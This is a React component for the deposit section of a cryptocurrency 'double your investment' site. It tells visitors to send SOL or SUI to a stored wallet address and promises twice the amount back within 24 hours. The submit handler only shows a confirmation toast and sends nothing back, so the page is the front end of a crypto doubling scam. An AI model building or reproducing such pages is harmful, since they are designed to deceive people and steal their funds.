import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import { motion } from 'framer-motion';
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { walletAddresses } from '@/lib/utils';
import { AlertTriangle } from 'lucide-react';
import CopyButton from '@/components/ui/copy-button';

import ParallaxSection from './ui/parallax-section';

// SVG Icons
const SolanaIcon = () => (
  <div className="w-10 h-10 mr-3 rounded-full bg-violet-600 flex items-center justify-center">
    <span className="font-bold text-white">SOL</span>
  </div>
);

const SUIIcon = () => (
  <div className="w-10 h-10 mr-3 rounded-full bg-[#6BCEFF] flex items-center justify-center">
    <span className="font-bold text-white">SUI</span>
  </div>
);

const depositsSchema = z.object({
  returnAddress: z.string().min(10, { message: "Please enter a valid wallet address" }),
});

type DepositsFormValues = z.infer<typeof depositsSchema>;

const steps = [
  {
    number: 1,
    title: "Choose Your Cryptocurrency",
    description: "Select whether you want to invest SOL or SUI"
  },
  {
    number: 2,
    title: "Copy Deposit Address",
    description: "Use the secure wallet address below for your chosen crypto"
  },
  {
    number: 3,
    title: "Send Your Investment",
    description: "Transfer the amount you want to double from your wallet"
  },
  {
    number: 4,
    title: "Receive Double Back",
    description: "Get twice your investment within 24 hours to your wallet"
  }
];

const bgImage = 'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&h=1080&q=80';

export default function Deposit() {
  const [selectedCrypto, setSelectedCrypto] = useState<'solana' | 'sui'>('solana');
  const { toast } = useToast();
  
  const form = useForm<DepositsFormValues>({
    resolver: zodResolver(depositsSchema),
    defaultValues: {
      returnAddress: '',
    },
  });

  function onSubmit(data: DepositsFormValues) {
    toast({
      title: "Deposit notification sent!",
      description: "We'll process your doubled investment within 24 hours.",
    });
  }
  
  const walletAddress = selectedCrypto === 'solana' 
    ? walletAddresses.solana 
    : walletAddresses.sui;
  
  const minDeposit = selectedCrypto === 'solana' ? 1 : 100;

  return (
    <ParallaxSection
      id="deposit"
      bgImage={bgImage}
      className="py-20 lg:py-32 bg-primary"
    >
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        {/* Mobile View */}
        <div className="lg:hidden">
          <div className="text-center mb-10">
            <h2 className="text-2xl font-bold mb-4">Double Your Investment</h2>
            <p className="text-gray-300 mb-6">Follow these steps to get started</p>
          </div>
          
          {/* Mobile Steps Carousel */}
          <div className="mb-8 px-1">
            <div className="overflow-x-auto pb-4 -mx-4 px-4 flex snap-x snap-mandatory">
              {steps.map((step) => (
                <motion.div 
                  key={step.number}
                  className="flex-shrink-0 w-[80%] snap-center mr-4 bg-secondary/60 backdrop-blur-md rounded-xl p-5 border border-white/5"
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.4, delay: step.number * 0.05 }}
                  viewport={{ once: true, margin: "-100px" }}
                >
                  <div className="flex items-center mb-3">
                    <div className="h-9 w-9 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center font-bold text-white mr-3">
                      {step.number}
                    </div>
                    <h3 className="text-base font-medium">{step.title}</h3>
                  </div>
                  <p className="text-sm text-gray-400 ml-12">{step.description}</p>
                </motion.div>
              ))}
            </div>
          </div>
          
          {/* Mobile Deposit Card */}
          <div className="rounded-xl overflow-hidden bg-secondary/60 backdrop-blur-md shadow-xl">
            {/* Crypto Selector Tabs */}
            <div className="flex rounded-t-xl bg-secondary p-1">
              <button
                className={`flex-1 flex items-center justify-center py-3 rounded-lg text-sm font-medium ${
                  selectedCrypto === 'solana' 
                    ? 'bg-violet-600 text-white shadow-lg' 
                    : 'text-gray-400 hover:text-white'
                }`}
                onClick={() => setSelectedCrypto('solana')}
              >
                <SolanaIcon />
                <span className="ml-2">SOL</span>
              </button>
              <button
                className={`flex-1 flex items-center justify-center py-3 rounded-lg text-sm font-medium ${
                  selectedCrypto === 'sui' 
                    ? 'bg-[#6BCEFF] text-white shadow-lg' 
                    : 'text-gray-400 hover:text-white'
                }`}
                onClick={() => setSelectedCrypto('sui')}
              >
                <SUIIcon />
                <span className="ml-2">SUI</span>
              </button>
            </div>
            
            <div className="p-5">
              <div className="mb-5">
                <div className="flex justify-between items-center mb-3">
                  <h3 className="text-base font-bold">Deposit Address</h3>
                  {selectedCrypto === 'solana' ? (
                    <div className="px-3 py-1 rounded-full text-xs bg-violet-600/20 text-white">
                      Solana Network
                    </div>
                  ) : (
                    <div className="px-3 py-1 rounded-full text-xs bg-[#6BCEFF]/20 text-white">
                      SUI Network
                    </div>
                  )}
                </div>
                
                <div className="bg-primary/60 rounded-lg overflow-hidden border border-gray-700/50">
                  <div className="p-3 font-mono text-xs break-all">
                    {walletAddress}
                  </div>
                  <div className="border-t border-gray-700/50 flex">
                    <CopyButton value={walletAddress} />
                    <div className="flex-1 p-2 text-xs text-center text-blue-400">
                      Send only {selectedCrypto === 'solana' ? 'SOL' : 'SUI'} to this address
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="bg-yellow-500/10 border border-yellow-500/50 rounded-lg p-3 mb-5">
                <div className="flex">
                  <AlertTriangle className="h-4 w-4 text-yellow-500 mr-2 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-yellow-200">
                    Minimum deposit: <span className="font-medium">{minDeposit} {selectedCrypto === 'solana' ? 'SOL' : 'SUI'}</span>. Processing time: up to 24 hours.
                  </p>
                </div>
              </div>
              
              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)}>
                  <FormField
                    control={form.control}
                    name="returnAddress"
                    render={({ field }) => (
                      <FormItem className="mb-4">
                        <FormLabel className="text-sm">Your Return Wallet Address</FormLabel>
                        <FormControl>
                          <Input 
                            placeholder="Enter your wallet address to receive doubled funds" 
                            {...field}
                            className="rounded-lg py-5 bg-primary/40 border-gray-700/50"
                          />
                        </FormControl>
                        <p className="mt-1 text-xs text-gray-400">This is where we'll send your doubled cryptocurrency</p>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <Button 
                    type="submit" 
                    className="w-full bg-gradient-to-r from-blue-500 to-purple-500 hover:opacity-90 py-6 h-auto rounded-xl text-white font-medium text-base shadow-lg"
                  >
                    I've Made My Deposit
                  </Button>
                </form>
              </Form>
            </div>
          </div>
        </div>
        
        {/* Desktop View */}
        <div className="hidden lg:grid lg:grid-cols-2 gap-12 items-center">
          <div>
            <h2 className="text-3xl md:text-4xl font-bold mb-6">Ready to Double Your Investment?</h2>
            <p className="text-xl text-gray-300 mb-8">Follow these simple steps to get started with your SOL or SUI investment</p>
            
            <div className="space-y-6">
              {steps.map((step) => (
                <motion.div 
                  key={step.number}
                  className="flex"
                  initial={{ opacity: 0, x: -20 }}
                  whileInView={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.5, delay: step.number * 0.1 }}
                  viewport={{ once: true }}
                >
                  <div className="flex-shrink-0 h-10 w-10 rounded-full bg-blue-500 flex items-center justify-center font-bold text-white">
                    {step.number}
                  </div>
                  <div className="ml-4">
                    <h3 className="text-lg font-medium">{step.title}</h3>
                    <p className="mt-1 text-gray-400">{step.description}</p>
                  </div>
                </motion.div>
              ))}
            </div>
          </div>
          
          <Card className="bg-secondary/60 backdrop-blur-md border-none shadow-xl">
            <div className="p-8">
              <h3 className="text-2xl font-bold mb-6">Deposit Now</h3>
              
              <div className="space-y-6">
                <div>
                  <div className="block text-sm font-medium text-gray-300 mb-2">Select Cryptocurrency</div>
                  <div className="grid grid-cols-2 gap-4">
                    <Button
                      type="button"
                      variant="outline"
                      className={`flex items-center justify-start p-4 h-auto ${
                        selectedCrypto === 'solana' ? 'bg-violet-600/10 border-violet-500 text-white' : ''
                      }`}
                      onClick={() => setSelectedCrypto('solana')}
                    >
                      <SolanaIcon />
                      <span className="font-medium">Solana</span>
                    </Button>
                    <Button
                      type="button"
                      variant="outline"
                      className={`flex items-center justify-start p-4 h-auto ${
                        selectedCrypto === 'sui' ? 'bg-[#6BCEFF]/10 border-[#6BCEFF]' : ''
                      }`}
                      onClick={() => setSelectedCrypto('sui')}
                    >
                      <SUIIcon />
                      <span className="font-medium">SUI</span>
                    </Button>
                  </div>
                </div>
                
                <div>
                  <div className="block text-sm font-medium text-gray-300 mb-2">
                    Deposit Address <span className="text-xs text-gray-500">(Click to Copy)</span>
                  </div>
                  <div className="relative">
                    <div className="flex items-center bg-primary/50 border border-gray-700 rounded-lg overflow-hidden">
                      <div className="flex-1 p-4 font-mono text-sm overflow-hidden overflow-ellipsis whitespace-nowrap">
                        {walletAddress}
                      </div>
                      <CopyButton value={walletAddress} />
                    </div>
                  </div>
                  <p className="mt-2 text-sm text-gray-400">
                    Send only <span className="font-medium">{selectedCrypto === 'solana' ? 'SOL' : 'SUI'}</span> to this address
                  </p>
                </div>
                
                <div className="bg-yellow-500/10 border border-yellow-500/50 rounded-lg p-4">
                  <div className="flex">
                    <AlertTriangle className="h-5 w-5 text-yellow-500 mr-2 flex-shrink-0" />
                    <p className="text-sm text-yellow-200">
                      Important: Please verify the address before sending. Minimum deposit is <span className="font-medium">{minDeposit} {selectedCrypto === 'solana' ? 'SOL' : 'SUI'}</span>.
                    </p>
                  </div>
                </div>
                
                <Form {...form}>
                  <form onSubmit={form.handleSubmit(onSubmit)}>
                    <FormField
                      control={form.control}
                      name="returnAddress"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Your Return Wallet Address</FormLabel>
                          <FormControl>
                            <Input 
                              placeholder="Enter your wallet address to receive doubled funds" 
                              {...field} 
                            />
                          </FormControl>
                          <p className="mt-2 text-sm text-gray-400">This is where we'll send your doubled cryptocurrency</p>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <Button 
                      type="submit" 
                      className="w-full bg-purple-500 hover:bg-purple-600 mt-6"
                    >
                      I've Made My Deposit
                    </Button>
                  </form>
                </Form>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </ParallaxSection>
  );
}
